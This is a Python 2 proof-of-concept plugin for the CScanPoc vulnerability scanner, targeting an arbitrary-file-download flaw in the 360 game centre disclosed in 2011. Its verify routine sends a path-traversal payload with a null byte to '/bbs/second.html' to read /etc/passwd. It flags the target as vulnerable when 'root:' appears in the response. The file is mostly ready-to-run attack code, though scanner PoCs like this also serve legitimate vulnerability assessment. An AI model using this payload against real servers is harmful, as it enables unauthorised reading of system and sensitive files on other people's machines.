# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = '360_0101' # 平台漏洞编号
    name = '360游戏中心任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2011-12-26'  # 漏洞公布时间
    desc = '''模版漏洞描述
    360游戏中心任意文件下载，
    能够访问/etc/passwd 文件，重要敏感信息泄露。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=4251
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '360'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f231a186-bfa0-4aa2-a6cf-9e2c9ed307e2' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/bbs/second.html?g=/../../../../../../../../../../../../etc/passwd%00.html"
            url  = self.target + payload
            response = requests.get(url)
            if 'root:' in response.text or "/bin/bash" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()